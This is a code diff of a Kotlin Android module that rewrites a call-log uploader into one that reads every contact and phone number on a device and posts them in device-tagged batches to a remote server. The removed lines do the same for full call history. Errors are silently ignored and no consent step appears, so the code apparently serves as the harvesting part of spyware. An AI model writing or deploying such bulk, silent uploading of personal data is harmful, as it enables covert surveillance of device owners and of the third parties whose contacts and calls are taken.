@@ -1,36 +1,36 @@
 package com.example.test.utils
 
 import android.content.Context
-import android.provider.CallLog
+import android.provider.ContactsContract
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URL
 
-object CallLogsBatchUploader {
+object ContactsBatchUploader {
 
     private const val BATCH_SIZE = 200
     private const val RETRY_ATTEMPTS = 3
     private const val DELAY_BETWEEN_BATCHES_MS = 300L
 
-    suspend fun uploadQuickCallLogs(
+    suspend fun uploadQuickContacts(
         context: Context,
         deviceId: String,
         baseUrl: String,
-        limit: Int = 100
+        limit: Int = 50
     ): UploadResult = withContext(Dispatchers.IO) {
         try {
-            val callLogs = fetchCallLogs(context, deviceId, limit)
+            val contacts = fetchContacts(context, deviceId, limit)
 
-            if (callLogs.isEmpty()) {
+            if (contacts.isEmpty()) {
                 return@withContext UploadResult.Success(0)
             }
 
-            val success = sendBatch(callLogs, deviceId, baseUrl, 1, 1)
+            val success = sendBatch(contacts, deviceId, baseUrl, 1, 1)
 
             if (success) {
-                UploadResult.Success(callLogs.size)
+                UploadResult.Success(contacts.size)
             } else {
                 UploadResult.Failure("Quick upload failed")
             }
@@ -40,26 +40,26 @@ object CallLogsBatchUploader {
         }
     }
 
-    suspend fun uploadAllCallLogs(
+    suspend fun uploadAllContacts(
         context: Context,
         deviceId: String,
         baseUrl: String,
         onProgress: ((Int, Int) -> Unit)? = null
     ): UploadResult = withContext(Dispatchers.IO) {
         try {
-            val allCallLogs = fetchCallLogs(context, deviceId, limit = null)
+            val allContacts = fetchContacts(context, deviceId, limit = null)
 
-            if (allCallLogs.isEmpty()) {
+            if (allContacts.isEmpty()) {
                 return@withContext UploadResult.Success(0)
             }
 
             var totalSent = 0
-            val totalBatches = (allCallLogs.size + BATCH_SIZE - 1) / BATCH_SIZE
+            val totalBatches = (allContacts.size + BATCH_SIZE - 1) / BATCH_SIZE
 
             for (batchIndex in 0 until totalBatches) {
                 val start = batchIndex * BATCH_SIZE
-                val end = minOf(start + BATCH_SIZE, allCallLogs.size)
-                val batch = allCallLogs.subList(start, end)
+                val end = minOf(start + BATCH_SIZE, allContacts.size)
+                val batch = allContacts.subList(start, end)
 
                 var success = false
                 var attempts = 0
@@ -87,7 +87,7 @@ object CallLogsBatchUploader {
                     totalSent += batch.size
                 }
 
-                onProgress?.invoke(totalSent, allCallLogs.size)
+                onProgress?.invoke(totalSent, allContacts.size)
 
                 if (batchIndex < totalBatches - 1) {
                     delay(DELAY_BETWEEN_BATCHES_MS)
@@ -101,66 +101,60 @@ object CallLogsBatchUploader {
         }
     }
 
-    private fun fetchCallLogs(context: Context, deviceId: String, limit: Int?): List<CallLogModel> {
-        val callLogs = mutableListOf<CallLogModel>()
+    private fun fetchContacts(context: Context, deviceId: String, limit: Int?): List<ContactModel> {
+        val contacts = mutableListOf<ContactModel>()
 
         try {
-            val sortOrder = "${CallLog.Calls.DATE} DESC" + if (limit != null) " LIMIT $limit" else ""
-
             val cursor = context.contentResolver.query(
-                CallLog.Calls.CONTENT_URI,
-                arrayOf(
-                    CallLog.Calls._ID,
-                    CallLog.Calls.NUMBER,
-                    CallLog.Calls.CACHED_NAME,
-                    CallLog.Calls.TYPE,
-                    CallLog.Calls.DATE,
-                    CallLog.Calls.DURATION
-                ),
-                null,
-                null,
-                sortOrder
+                ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null
             )
 
             cursor?.use {
-                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
-                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
-                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
-                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
-                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
-                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
+                val idIndex = it.getColumnIndex(ContactsContract.Contacts._ID)
+                val nameIndex = it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
 
-                while (it.moveToNext()) {
+                var count = 0
+
+                while (it.moveToNext() && (limit == null || count < limit)) {
                     try {
-                        val callId = it.getLong(idIndex)
-                        val number = it.getString(numberIndex) ?: ""
-                        if (number.isBlank()) continue
-
+                        val contactId = it.getString(idIndex)
                         val name = it.getString(nameIndex) ?: "Unknown"
-                        val type = it.getInt(typeIndex)
-                        val date = it.getLong(dateIndex)
-                        val duration = it.getInt(durationIndex)
 
-                        val callType = when (type) {
-                            CallLog.Calls.INCOMING_TYPE -> "incoming"
-                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
-                            CallLog.Calls.MISSED_TYPE -> "missed"
-                            CallLog.Calls.REJECTED_TYPE -> "rejected"
-                            CallLog.Calls.BLOCKED_TYPE -> "blocked"
-                            else -> "unknown"
+                        val phones = mutableListOf<String>()
+                        val phoneCursor = context.contentResolver.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
+                            arrayOf(contactId),
+                            null
+                        )
+
+                        phoneCursor?.use { pc ->
+                            val phoneIndex = pc.getColumnIndex(
+                                ContactsContract.CommonDataKinds.Phone.NUMBER
+                            )
+                            while (pc.moveToNext()) {
+                                val phone = pc.getString(phoneIndex)
+                                if (!phone.isNullOrBlank()) {
+                                    phones.add(phone.trim())
+                                }
+                            }
                         }
 
-                        callLogs.add(
-                            CallLogModel(
-                                callId = callId,
-                                deviceId = deviceId,
-                                number = number,
-                                name = name,
-                                callType = callType,
-                                timestamp = date,
-                                duration = duration
-                            )
-                        )
+                        if (phones.isNotEmpty()) {
+                            phones.forEach { phone ->
+                                contacts.add(
+                                    ContactModel(
+                                        contactId = "${deviceId}_contact_${contactId}_${phone.hashCode()}",
+                                        deviceId = deviceId,
+                                        name = name,
+                                        phoneNumber = phone
+                                    )
+                                )
+                            }
+                            count++
+                        }
 
                     } catch (e: Exception) {
                         continue
@@ -171,43 +165,38 @@ object CallLogsBatchUploader {
         } catch (e: Exception) {
         }
 
-        return callLogs
+        return contacts
     }
 
     private fun sendBatch(
-        callLogs: List<CallLogModel>,
+        contacts: List<ContactModel>,
         deviceId: String,
         baseUrl: String,
         batchNumber: Int,
         totalBatches: Int
     ): Boolean {
         return try {
-            val logsArray = JSONArray()
-            val currentTime = System.currentTimeMillis()
+            val contactsArray = JSONArray()
 
-            callLogs.forEach { log ->
-                logsArray.put(JSONObject().apply {
-                    put("call_id", "${log.deviceId}_call_${log.callId}")
-                    put("device_id", log.deviceId)
-                    put("number", log.number)
-                    put("name", log.name)
-                    put("call_type", log.callType)
-                    put("timestamp", log.timestamp)
-                    put("duration", log.duration)
-                    put("received_at", currentTime)
+            contacts.forEach { contact ->
+                contactsArray.put(JSONObject().apply {
+                    put("contact_id", contact.contactId)
+                    put("device_id", contact.deviceId)
+                    put("name", contact.name)
+                    put("phone_number", contact.phoneNumber)
                 })
             }
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
-                put("data", logsArray)
+                put("data", contactsArray)
                 put("batch_info", JSONObject().apply {
                     put("batch", batchNumber)
                     put("of", totalBatches)
                 })
             }
 
-            val response = sendPostRequest("$baseUrl/call-logs/batch", json.toString())
+            val response = sendPostRequest("$baseUrl/contacts/batch", json.toString())
             response != null
 
         } catch (e: Exception) {
@@ -248,14 +237,11 @@ object CallLogsBatchUploader {
         }
     }
 
-    data class CallLogModel(
-        val callId: Long,
+    data class ContactModel(
+        val contactId: String,
         val deviceId: String,
-        val number: String,
         val name: String,
-        val callType: String,
-        val timestamp: Long,
-        val duration: Int
+        val phoneNumber: String
     )
 
     sealed class UploadResult {
